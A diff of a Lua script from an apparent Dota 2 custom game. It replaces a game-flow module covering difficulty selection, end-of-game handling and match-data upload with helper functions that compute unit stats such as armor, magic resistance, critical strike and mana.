@@ -1,1038 +1,279 @@
-if GameMain == nil then
-	--- @class GameMain
-	GameMain = {}
+-- 额外基础攻击力
+function GetBaseBonusDamage(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_BASEATTACK_BONUSDAMAGE, tParams)
 end
-
-if _G.tPlayerPortraitUnits == nil then
-	_G.tPlayerPortraitUnits = {}
+-- 物理防御
+function GetBasePhysicalArmor(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_PHYSICAL_ARMOR_BASE)
 end
-
-function GameMain:init(bReload)
-	if not bReload then
-		self.bGameEnd = false
-		if IsInToolsMode() then
-			self.bDebugAliveForever = true
+function GetBonusPhysicalArmor(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_PHYSICAL_ARMOR_BONUS)
+end
+function GetBasePhysicalArmorPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_PHYSICAL_ARMOR_BASE_PERCENTAGE)
+end
+function GetPhysicalArmorPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_PHYSICAL_ARMOR_PERCENTAGE)
+end
+function GetPhysicalArmor(hUnit)
+	local fTotalPercent = GetPhysicalArmorPercentage(hUnit) * 0.01 -- 不要调用两遍
+	return GetBasePhysicalArmor(hUnit) * (1 + GetBasePhysicalArmorPercentage(hUnit) * 0.01 + fTotalPercent) + GetBonusPhysicalArmor(hUnit) * (1 + fTotalPercent)
+end
+function GetIgnorePhysicalArmorPercentage(hUnit, tParams)
+	return SubtractionMultiplicationPercentage(GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_PHYSICAL_ARMOR_PERCENTAGE, tParams), GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_PHYSICAL_ARMOR_PERCENTAGE_UNIQUE, tParams))
+end
+function GetIgnorePhysicalArmorPercentageTarget(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_PHYSICAL_ARMOR_PERCENTAGE_TARGET, tParams)
+end
+function GetPhysicalReduction(hUnit, tParams)
+	local fValue = GetPhysicalArmor(hUnit)
+	-- 负甲的时候不计算无视护甲
+	if fValue > 0 then
+		local fIgnore = GetIgnorePhysicalArmorPercentageTarget(hUnit, tParams) -- 自身被百分比无视护甲
+		if tParams and IsValid(tParams.attacker) then
+			fValue = math.max(0, fValue - GetModifierProperty(tParams.attacker, EOM_MODIFIER_PROPERTY_IGNORE_PHYSICAL_ARMOR_CONSTANT, tParams))
+			fIgnore = SubtractionMultiplicationPercentage(fIgnore, GetIgnorePhysicalArmorPercentage(tParams.attacker, tParams))
 		end
-		self.playerGameModeSelection = {}
-		self.tPlayerRecords = {}
-		-- 自定义暂停
-		self.bIsPause = false
-		self.tPlayerLastPauseTime = {}
-		self.tPlayerLastUnPauseTime = {}
-		self.bShowCritParticle = true
+		fValue = fValue - math.max(fValue * fIgnore * 0.01, 0)
+	end
+	return PHYSICAL_ARMOR_FACTOR * fValue / (1 + PHYSICAL_ARMOR_FACTOR * math.abs(fValue))
+end
+-- 魔法防御
+function GetBaseMagicalArmor(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAGICAL_ARMOR_BASE)
+end
+function GetBonusMagicalArmor(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAGICAL_ARMOR_BONUS)
+end
+function GetBaseMagicalArmorPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAGICAL_ARMOR_BASE_PERCENTAGE)
+end
+function GetMagicalArmorPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAGICAL_ARMOR_PERCENTAGE)
+end
+function GetMagicalArmor(hUnit)
+	return GetBaseMagicalArmor(hUnit) * (1 + GetBaseMagicalArmorPercentage(hUnit) * 0.01 + GetMagicalArmorPercentage(hUnit) * 0.01) + GetBonusMagicalArmor(hUnit) * (1 + GetMagicalArmorPercentage(hUnit) * 0.01)
+end
+function GetIgnoreMagicalArmorPercentage(hUnit, tParams)
+	return SubtractionMultiplicationPercentage(GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_MAGICAL_ARMOR_PERCENTAGE, tParams), GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_MAGICAL_ARMOR_PERCENTAGE_UNIQUE, tParams))
+end
+function GetIgnoreMagicalArmorConstant(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_MAGICAL_ARMOR_CONSTANT, tParams)
+end
+function GetIgnoreMagicalArmorPercentageTarget(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_IGNORE_MAGICAL_ARMOR_PERCENTAGE_TARGET, tParams)
+end
+function GetMagicalReduction(hUnit, tParams)
+	local fValue = GetMagicalArmor(hUnit)
+	-- 负甲的时候不计算无视护甲
+	if fValue > 0 then
+		local fIgnore = GetIgnoreMagicalArmorPercentageTarget(hUnit, tParams) -- 自身的被百分比无视护甲
+		if tParams and IsValid(tParams.attacker) then
+			fValue = fValue - math.min(GetIgnoreMagicalArmorConstant(tParams.attacker, tParams), fValue)
+			fIgnore = SubtractionMultiplicationPercentage(fIgnore, GetIgnoreMagicalArmorPercentage(tParams.attacker, tParams))
+		end
+		fValue = fValue - math.max(fValue * fIgnore * 0.01, 0)
 	end
 
-	-- 是否上传过end data
-	self.tHasUpdateEndData = {}
-
-	GameEvent("npc_spawned", Dynamic_Wrap(GameMain, "OnNPCSpawned"), GameMain)
-	GameEvent("custom_npc_first_spawned", Dynamic_Wrap(GameMain, "OnNPCFirstSpawned"), GameMain)
-	GameEvent("game_rules_state_change", Dynamic_Wrap(GameMain, "OnGameRulesStateChange"), GameMain)
-	-- GameEvent("entity_killed", Dynamic_Wrap(GameMain, "OnEntityKilled"), GameMain)
-	GameEvent("player_chat", Dynamic_Wrap(GameMain, "OnPlayerChat"), GameMain)
-	GameEvent("dota_player_used_ability", Dynamic_Wrap(GameMain, "OnAbilityUsed"), GameMain)
-	GameEvent("custom_round_changed", Dynamic_Wrap(GameMain, "OnRoundChanged"), GameMain)
-
-	-- CustomUIEvent("T15_Gamble", Dynamic_Wrap(GameMain, "OnT15_Gamble"), GameMain)
-	CustomUIEvent("RemoveBuilding", Dynamic_Wrap(GameMain, "OnRemoveBuilding"), GameMain)
-	CustomUIEvent("SelectDifficulty", Dynamic_Wrap(GameMain, "OnSelectDifficulty"), GameMain)
-	CustomUIEvent('EndlessSetting', Dynamic_Wrap(GameMain, "OnEndlessSetting"), GameMain)
-	CustomUIEvent("SelectUnit", Dynamic_Wrap(GameMain, "OnSelectUnit"), GameMain)
-	CustomUIEvent("EndGameAhead", Dynamic_Wrap(GameMain, "OnGameEndAhead"), GameMain)
-	CustomUIEvent("CustomTogglePause", Dynamic_Wrap(GameMain, "OnCustomTogglePause"), GameMain)
-	CustomUIEvent("CustomTimeScale", Dynamic_Wrap(GameMain, "OnCustomTimeScale"), GameMain)
+	return MAGICAL_ARMOR_FACTOR * fValue / (1 + MAGICAL_ARMOR_FACTOR * math.abs(fValue))
 end
-function GameMain:OnSelectUnit(id, data)
-	local hUnit = EntIndexToHScript(data.iUnit or -1)
-	if IsValid(hUnit) and type(data.PlayerID) == "number" then
-		_G.tPlayerPortraitUnits[data.PlayerID] = hUnit
-	end
+-- 技能增强
+function GetBaseSpellAmplify(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_AMPLIFY_BASE, tParams)
 end
---=======================================难度选择=======================================
-function GameMain:StartGameModeSelection()
-	self.GameModeSelectionEndTime = GameRules:GetGameTime() + SETTING_TIMES
-	GameRules:GetGameModeEntity():SetContextThink(DoUniqueString("GameModeSelectionTimer"), function()
-		if GameRules:GetGameTime() >= self.GameModeSelectionEndTime then
-			self:FinishGameModeSelection()
-			return nil
+function GetBonusSpellAmplify(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_AMPLIFY_BONUS, tParams)
+end
+function GetBonusSpellAmplifyUnique(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_AMPLIFY_BONUS_UNIQUE, tParams)
+end
+function GetSpellAmplify(hUnit, tParams)
+	return GetBaseSpellAmplify(hUnit, tParams) + GetBonusSpellAmplify(hUnit, tParams) + GetBonusSpellAmplifyUnique(hUnit, tParams)
+end
+-- 生命值
+function GetHealthBonus(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_HEALTH_BONUS)
+end
+function GetHealthPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_HEALTH_PERCENTAGE)
+end
+function GetHealthPercentageEnemy(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_HEALTH_PERCENT_ENEMY)
+end
+-- 生命恢复
+function GetHealthRegen(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_HEALTH_REGEN_CONSTANT)
+end
+-- 魔法值
+function GetManaBonus(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MANA_BONUS)
+end
+function GetManaPercentage(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MANA_PERCENTAGE)
+end
+function GetBaseMana(hUnit)
+	local fValue = 0
+	if hUnit ~= nil then
+		if IsValid(hUnit) and hUnit._StatusMana == nil then
+			local sUnitName = hUnit:GetUnitName()
+			local tData = hUnit:IsHero() and KeyValues.HeroesKv[sUnitName] or KeyValues.UnitsKv[sUnitName]
+			if tData then
+				hUnit._StatusMana = tonumber(tData.StatusMana) or 0
+			end
 		end
+		if hUnit._StatusMana ~= nil then
+			fValue = hUnit._StatusMana
+		end
+	end
+	return fValue
+end
+function GetTotalManaBonus(hUnit)
+	local fPercent = GetManaPercentage(hUnit) * 0.01
+	return GetManaBonus(hUnit) * (1 + fPercent) + GetBaseMana(hUnit) * fPercent
+end
+-- 魔法恢复
+function GetManaRegen(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MANA_REGEN_CONSTANT) + GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MANA_REGEN_CONSTANT_UNIQUE)
+end
+
+function GetManaRegenAmplify(hUnit, params)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MP_REGEN_AMPLIFY_PERCENTAGE, params)
+end
+
+function GetManaRegenTotal(hUnit)
+	return (hUnit:GetStatusManaRegen() + GetManaRegen(hUnit)) * (1 + GetManaRegenAmplify(hUnit) / 100)
+end
+-- 状态抗性
+function GetStatusResistanceStack(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_STATUS_RESISTANCE_STACKING)
+end
+function GetStatusResistanceUnique(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_STATUS_RESISTANCE_UNIQUE)
+end
+function GetStatusResistance(hUnit)
+	return (1 - (1 - GetStatusResistanceStack(hUnit) * 0.01) * (1 - GetStatusResistanceUnique(hUnit) * 0.01)) * 100
+end
+function GetStatusResistanceCaster(hUnit)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_STATUS_RESISTANCE_CASTER)
+end
+-- 闪避
+function GetEvasion(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_EVASION_CONSTANT, tParams)
+end
+-- 技能闪避
+function GetSpellEvasion(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_EVASION, tParams)
+end
+-- 冷却减少
+function GetCooldownReduction(hUnit, tParams)
+	local cd_reduction = GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_COOLDOWN_PERCENTAGE, tParams)
+	local max_cd_reduction = GetMaxCooldownReduction(hUnit, tParams)
+	if max_cd_reduction > 0 and max_cd_reduction < cd_reduction then
+		return max_cd_reduction
+	end
+	return cd_reduction
+end
+function GetMaxCooldownReduction(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAX_COOLDOWN_PERCENTAGE, tParams)
+end
+-- 物理暴击
+function GetCriticalStrikeChance(hUnit, tParams)
+	if GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_NO_CRITICALSTRIKE, tParams) >= 1 then
 		return 0
-	end, 0)
-	self:UpdateNetTables()
+	end
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_CRITICALSTRIKE_CHANCE, tParams) + BASE_ATTACK_CRITICALSTRIKE_CHANCE
 end
--- 后端收到数据的时候，更新玩家默认选择最高难度
-function GameMain:UpdateDefaultDifficulty(iPlayerID, iDifficulty)
-	if iDifficulty == DIFFICULTY_LAST then
-		iDifficulty = DIFFICULTY_ENDLESS
+-- 物理暴击伤害
+function GetCriticalStrikeDamage(hUnit, tParams)
+	local fDamage = BASE_ATTACK_CRITICALSTRIKE_DAMAGE + GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_CRITICALSTRIKE_DAMAGE, tParams)
+	if tParams and IsValid(tParams.target) then
+		fDamage = fDamage + GetModifierProperty(tParams.target, EOM_MODIFIER_PROPERTY_INCOMING_CRITICALSTRIKE_DAMAGE_CONSTANT, tParams)
 	end
-	if self.playerGameModeSelection[iPlayerID] == nil then
-		self.playerGameModeSelection[iPlayerID] = {
-			difficulty = iDifficulty,
-			is_default_difficulty = true,
-			endlesslayer = 1,
-		}
-	end
-	if self.playerGameModeSelection[iPlayerID].is_default_difficulty == true then
-		self.playerGameModeSelection[iPlayerID].difficulty = iDifficulty
-		self:UpdateNetTables()
-	end
+	local fPercent = GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_CRITICALSTRIKE_DAMAGE_TOTAL, tParams)
+	return fDamage * (1 + fPercent / 100)
 end
--- 结束难度选择，优先最低难度，没有手动点过的人会被排除掉
-function GameMain:FinishGameModeSelection()
-	self.GameModeSelectionEndTime = -1
-
-	local iSelectedDifficulty = DIFFICULTY_ENDLESS
-	self:EachPlayer(function(n, playerID)
-		if self.playerGameModeSelection[playerID] then
-			-- 优先低难度
-			iSelectedDifficulty = math.min(iSelectedDifficulty, self.playerGameModeSelection[playerID].difficulty)
-		end
-		local player = PlayerResource:GetPlayer(playerID)
-		if player ~= nil then
-			player:SetSelectedHero(FORCE_PICKED_HERO)
-		end
-	end)
-	self:SetDifficulty(iSelectedDifficulty)
-
-	self.iEndlessLayer = 0
-	if iSelectedDifficulty == DIFFICULTY_ENDLESS then
-		-- 多人无尽选择规则
-		local endlesslayer = -1
-		self:EachPlayer(function(n, playerID)
-			if endlesslayer == -1 then
-				endlesslayer = self.playerGameModeSelection[playerID].endlesslayer
-			else
-				endlesslayer = math.min(endlesslayer, self.playerGameModeSelection[playerID].endlesslayer)
-			end
-		end)
-		self:SetEndlessLayer(endlesslayer)
-	end
+--物理暴击时技能暴击补偿
+function GetCriticalStrikeDamage_Mix(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_CRITICALSTRIKE_MIX_PERCENT, tParams) * 0.01  * GetSpellCriticalStrikeDamage(hUnit, tParams)
 end
---=======================================游戏结算=======================================
---- 成功
-function GameMain:OnGameEndAhead(id, data)
-	local iPlayerID = data.PlayerID
-	if type(iPlayerID) == "number" and PlayerResource:IsValidPlayer(iPlayerID) then
-		local hero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-		if IsValid(hero) then
-			GameMain:Victory()
-		end
+-- 技能暴击概率
+function GetSpellCriticalStrikeChance(hUnit, tParams)
+	if GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_NO_SPELL_CRITICALSTRIKE, tParams) >= 1 then
+		return 0
 	end
+	local fChance = GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_CRITICALSTRIKE_CHANCE, tParams) + BASE_SPELL_CRITICALSTRIKE_CHANCE
+	if tParams and IsValid(tParams.target) then
+		fChance = fChance + GetModifierProperty(tParams.target, EOM_MODIFIER_PROPERTY_SPELL_CRITICALSTRIKE_CHANCE_TARGET, tParams)
+	end
+	return fChance
 end
-
-function GameMain:Victory()
-	print("GameMain:Victory")
-
-	if self.bDebugAliveForever then
-		return
+-- 技能暴击伤害
+function GetSpellCriticalStrikeDamage(hUnit, tParams)
+	local fDamage = BASE_SPELL_CRITICALSTRIKE_DAMAGE + GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_CRITICALSTRIKE_DAMAGE)
+	if tParams and IsValid(tParams.target) then
+		fDamage = fDamage + GetModifierProperty(tParams.target, EOM_MODIFIER_PROPERTY_INCOMING_SPELL_CRITICALSTRIKE_DAMAGE_CONSTANT, tParams)
 	end
-	-- if IsInToolsMode() then
-	-- 	print("DebugVictory")
-	-- 	return
-	-- end
-	if self.bGameEnd == true then
-		return
-	end
-
-	-- self:EachPlayer(function(n, iPlayerID)
-	-- 	local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-	-- 	if IsValid(hHero) and hHero:IsAlive() then
-	-- 		hHero:ForceKill(false)
-	-- 	end
-	-- end)
-	Spawner:RemoveAll()
-
-	self.bGameEnd = true
-	self.bVictory = true
-	self:UploadDataBeforeEnd()
-
-	if RollPercentage(Service.iFrozenChance or 0) then
-		GameRules:SetGameTimeFrozen(true)
-
-		Timer(Service.fFrozenTime or 3600, function()
-			GameRules:SetGameTimeFrozen(false)
-		end)
-	end
+	local fPercent = GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_CRITICALSTRIKE_DAMAGE_TOTAL, tParams)
+	return fDamage * (1 + fPercent / 100)
 end
---- 失败
-function GameMain:Defeat(bForceLose)
-	print("GameMain:Defeat")
-	if (not bForceLose) and self.bDebugAliveForever then
-		return
-	end
-	if self.bGameEnd == true then
-		return
-	end
-
-	-- self:EachPlayer(function(n, iPlayerID)
-	-- 	local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-	-- 	if IsValid(hHero) and hHero:IsAlive() then
-	-- 		hHero:ForceKill(false)
-	-- 	end
-	-- end)
-	Spawner:RemoveAll()
-
-	self.bGameEnd = true
-	self.bVictory = false
-
-	self:UploadDataBeforeEnd()
-
-	if RollPercentage(Service.iFrozenChance or 0) then
-		GameRules:SetGameTimeFrozen(true)
-
-		Timer(Service.fFrozenTime or 3600, function()
-			GameRules:SetGameTimeFrozen(false)
-		end)
-	end
+--技能暴击时物理暴击补偿
+function GetSpellCriticalStrikeDamage_Mix(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_SPELL_CRITICALSTRIKE_MIX_PERCENT, tParams) * 0.01  * GetCriticalStrikeDamage(hUnit, tParams)
 end
---- @private
---- 在游戏结束前上传数据
-function GameMain:UploadDataBeforeEnd()
-	Notification:Upper({
-		message = "#Game_end_please_wait",
-	})
-
-	self:EachPlayer(function(n, iPlayerID)
-		self:UpdatePlayerEndData(iPlayerID)
-	end)
-
-	BpTask:SendTaskUpdate2Service()
-
-	-- 上传超时就不上传了
-	GameRules:GetGameModeEntity():Timer(REQUEST_TIME_OUT + 1, function()
-		self:EnterEndGame()
-	end)
+-- 最大攻击速度
+function GetBonusMaximumAttackSpeed(hUnit)
+	if GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAX_ATTACKSPEED_BONUS_UNABLE) >= 1 then
+		return 0
+	end
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_MAX_ATTACKSPEED_BONUS)
 end
---- 上传单个玩家结束数据，在玩家结束游戏后才会被调用
-function GameMain:UpdatePlayerEndData(hHero)
-	local iPlayerID
-	if type(hHero) == "table" then
-		iPlayerID = hHero:GetPlayerOwnerID()
-	else
-		iPlayerID = hHero
-		hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-	end
-
-	if self.tHasUpdateEndData[iPlayerID] == true then
-		return
-	else
-		self.tHasUpdateEndData[iPlayerID] = true
-	end
-
-	Service:GameFinished(iPlayerID, self.bVictory)
+function GetMaximumAttackSpeed(hUnit)
+	return GetBonusMaximumAttackSpeed(hUnit) + MAXIMUM_ATTACK_SPEED
 end
---- 判断是否所有上传都完成
-function GameMain:CheckAllUpLoadSuccess()
-	-- 所有这些变量都为true
-	local needs = {
-		"GameFinished",
-	-- "EndGameTask",
-	}
-	for _, k in pairs(needs) do
-		if self[k] ~= true then
-			return false
-		end
-	end
-	return true
+function GetOutgoingDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_OUTGOING_DAMAGE_PERCENTAGE, tParams)
 end
---- 每个上传操作完成时都调用，发现全部都上传完成了就进入游戏结束阶段
---- @param sKey string 需要在CheckAllUpLoadSuccess()函数里的needs里定义
-function GameMain:TryEnterEndGame(sKey)
-	self[sKey] = true
-	if self:CheckAllUpLoadSuccess() then
-		self:EnterEndGame()
-	end
+function GetOutgoingPhysicalDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_OUTGOING_PHYSICAL_DAMAGE_PERCENTAGE, tParams)
 end
---- @private
-function GameMain:EnterEndGame()
-	if self.bVictory then
-		EmitAnnouncerSound("announcer_ann_custom_end_02")
-		EmitGlobalSound("Game.Victory")
-	else
-		EmitAnnouncerSound("announcer_ann_custom_end_08")
-		EmitGlobalSound("Game.Defeat")
-	end
-
-	CustomNetTables:SetTableValue("common", "end_game", {
-		is_end_game = true,
-		victory = self.bVictory,
-		up_load_success = self:CheckAllUpLoadSuccess()
-	})
+function GetOutgoingMagicalDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_OUTGOING_MAGICAL_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:IsGameEnd()
-	return self.bGameEnd
+function GetOutgoingPureDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_OUTGOING_PURE_DAMAGE_PERCENTAGE, tParams)
 end
---=======================================监听=======================================
-function GameMain:OnGameRulesStateChange()
-	local state = GameRules:State_Get()
-
-	-- 游戏初始化
-	if state == DOTA_GAMERULES_STATE_CUSTOM_GAME_SETUP then
-		local iStartFrozenTime = -1
-		Timer("OnPlayerDisconnect", 1, function()
-			local iValidPlayer = 0
-			local iDisconnectPlayer = 0
-
-			if self.bForceFrozen then
-				return 1
-			end
-
-			self:EachPlayer(function(n, iPlayerID)
-				local connectState = PlayerResource:GetConnectionState(iPlayerID)
-
-				local hHero = PlayerResource:GetSelectedHeroEntity(iPlayerID)
-				local bValidHero = IsValid(hHero) and hHero:IsAlive()
-				if bValidHero then
-					iValidPlayer = iValidPlayer + 1
-				end
-
-				if connectState == DOTA_CONNECTION_STATE_DISCONNECTED then
-					if bValidHero then
-						iDisconnectPlayer = iDisconnectPlayer + 1
-					end
-				elseif connectState == DOTA_CONNECTION_STATE_ABANDONED then
-					if bValidHero then
-						hHero:ForceKill(false)
-					end
-					if GameRules:State_Get() >= DOTA_GAMERULES_STATE_GAME_IN_PROGRESS then
-						if self.tHasUpdateEndData[iPlayerID] ~= true then
-							self:UpdatePlayerEndData(iPlayerID)
-							Spawner:RemovePlayerAll(iPlayerID)
-						end
-					end
-				end
-			end)
-
-			if not self.bGameEnd then
-				if iValidPlayer > 0 and iValidPlayer == iDisconnectPlayer then
-					if iStartFrozenTime <= 0 then
-						GameRules:SetGameTimeFrozen(true)
-						iStartFrozenTime = Time()
-					end
-				else
-					GameRules:SetGameTimeFrozen(false)
-					iStartFrozenTime = -1
-				end
-			end
-
-			if iStartFrozenTime > 0 and Time() - iStartFrozenTime > 3600 then
-				GameRules:SetGameTimeFrozen(false)
-			end
-
-			self.bIsPause = GameRules:IsGamePaused()
-			self:UpdateNetTables()
-
-			return 1
-		end)
-		-- 添加机器人
-		-- if IsInToolsMode() then
-		-- 	GameRules:GetGameModeEntity():GameTimer(0,function()
-		-- 		SendToConsole("dota_bot_populate")
-		-- 	end)
-		-- end
-	elseif state == DOTA_GAMERULES_STATE_HERO_SELECTION then
-		-- _G.START_POINT = {
-		-- 	Entities:FindByName(nil, "player_0_start"),
-		-- 	Entities:FindByName(nil, "player_1_start"),
-		-- 	Entities:FindByName(nil, "player_2_start"),
-		-- 	Entities:FindByName(nil, "player_3_start"),
-		-- }
-		DOTA_PlayerColor = {
-			3372543,
-			16739072,
-			15986699,
-			12517567,
-			6750143,
-			10774784,
-			33569,
-			6674935,
-			10597447,
-			16680642,
-		}
-
-		DOTA_PlayerColorVector = {}
-
-		for i, v in ipairs(DOTA_PlayerColor) do
-			local hex = string.format("%x", v)
-			local x = tonumber("0x" .. string.sub(hex, 1, 2)) or 0
-			local y = tonumber("0x" .. string.sub(hex, 3, 4)) or 0
-			local z = tonumber("0x" .. string.sub(hex, 5, 6)) or 0
-			table.insert(DOTA_PlayerColorVector, Vector(x, y, z))
-			PlayerResource:SetCustomPlayerColor(i - 1, x, y, z)
-		end
-
-		DOTA_PlayerColorVector[0] = Vector(255, 255, 255)
-
-		self:EachPlayer(function(n, iPlayerID)
-			if self.playerGameModeSelection[iPlayerID] == nil then
-				self.playerGameModeSelection[iPlayerID] = {
-					difficulty = DIFFICULTY_EASY,
-					is_default_difficulty = true,
-					endlesslayer = 1,
-				}
-			end
-			-- TODO:测试
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_START_GOLD, 5000, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_START_WOOD, 5000, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_START_WOOD_SEC, 10, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_START_POINT, 5000, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_POPULATION_LEVEL, 1, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_POPULATION, 100, self)
-			-- PlayerProperty:SetProperty(iPlayerID, PLAYER_PROPERTY_MAX_ARTIFACT_COUNT, 5, self)
-		end)
-		self:StartGameModeSelection()
-		self:UpdateNetTables()
-	elseif state == DOTA_GAMERULES_STATE_GAME_IN_PROGRESS then
-		self.iFirstPlayerCount = self:GetValidPlayerCount()
-		GameTimer(5, function()
-			self:EachPlayer(function(n, iPlayerID)
-				local iPlayerLevel = 0
-				if type(Services) == "table" and type(Services.tNettableData) == "table" and type(Services.tNettableData.playerLevel) == "table" then
-					iPlayerLevel = Services.tNettableData.playerLevel.level or iPlayerLevel
-				end
-				Service:UploadMatchData(iPlayerID, {
-					difficulty = self:GetDifficulty(),
-					layer = self:GetEndLessLayer(),
-					player_level = iPlayerLevel,
-					courier = PlayerCourier:GetPlayerCourierInUse(iPlayerID),
-				})
-			end)
-		end)
-	end
+-- 受到的伤害
+function GetIncomingDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:OnNPCSpawned(events)
-	local hSpawnedUnit = EntIndexToHScript(events.entindex)
-	if hSpawnedUnit == nil then return end
-
-	local sUnitName = hSpawnedUnit:GetUnitName()
-
-	if sUnitName == "npc_dota_companion" then
-		hSpawnedUnit:Remove()
-		return
-	end
-
-	FireGlobalModifierEvent(MODIFIER_EVENT_ON_NPC_SPAWNED, { unit = hSpawnedUnit })
-
-	if not hSpawnedUnit.bIsNotFirstSpawn then
-		if hSpawnedUnit:GetUnitName() ~= "npc_dota_thinker" then
-			hSpawnedUnit:GameTimer(0, function()
-				if not hSpawnedUnit:HasAbility("unit_state") then
-					hSpawnedUnit:AddAbility("unit_state")
-				end
-			end)
-			-- if hSpawnedUnit:GetUnitName() == "npc_dota_hero_slark_custom" then
-			hSpawnedUnit:AddNewModifier(hSpawnedUnit, nil, "modifier_common", nil)
-			-- end
-			hSpawnedUnit:SetPhysicalArmorBaseValue(0)
-			hSpawnedUnit:SetBaseMagicalResistanceValue(0)
-		end
-		hSpawnedUnit.bIsNotFirstSpawn = true
-		-- 首次出生事件
-		---@class EventData_ON_FIRST_NPC_SPAWNED
-		local tEvent = { entindex = hSpawnedUnit:entindex() }
-		FireGameEvent("custom_npc_first_spawned", tEvent)
-		-- 技能添加事件
-		for index = 0, hSpawnedUnit:GetAbilityCount() - 1, 1 do
-			local ability = hSpawnedUnit:GetAbilityByIndex(index)
-			if ability then
-				FireGameEvent("custom_unit_ability_added", { entityIndex = hSpawnedUnit:entindex(), abilityIndex = ability:entindex() })
-			end
-		end
-		-- 自定义增加技能func
-		local funcAddAbility = hSpawnedUnit.AddAbility
-		if funcAddAbility then
-			hSpawnedUnit.AddAbility = function(hUnit, sAbilityName)
-				local hAbility = funcAddAbility(hUnit, sAbilityName)
-				if hAbility then
-					hUnit:RemoveModifierByName(hAbility:GetIntrinsicModifierName() or "")
-					FireGameEvent("custom_unit_ability_added", { entityIndex = hUnit:entindex(), abilityIndex = hAbility:entindex() })
-				end
-				return hAbility
-			end
-		end
-	end
+function GetIncomingPhysicalDamagePercent(hUnit, tParams)
+	return GetModifierProperty(hUnit, EOM_MODIFIER_PROPERTY_INCOMING_PHYSICAL_DAMAGE_PERCENTAGE, tParams)
 end
-function GameMain:OnNPCFirstSpawned(events)
-	local hSpawnedUnit = EntIndexToHScript(events.entindex)
-	if not IsValid(hSpawnedUnit) then return end
-
-	-- 添加默认modifier
-	local tData = KeyValues.UnitsKv[hSpawnedUnit:GetUnitName()]
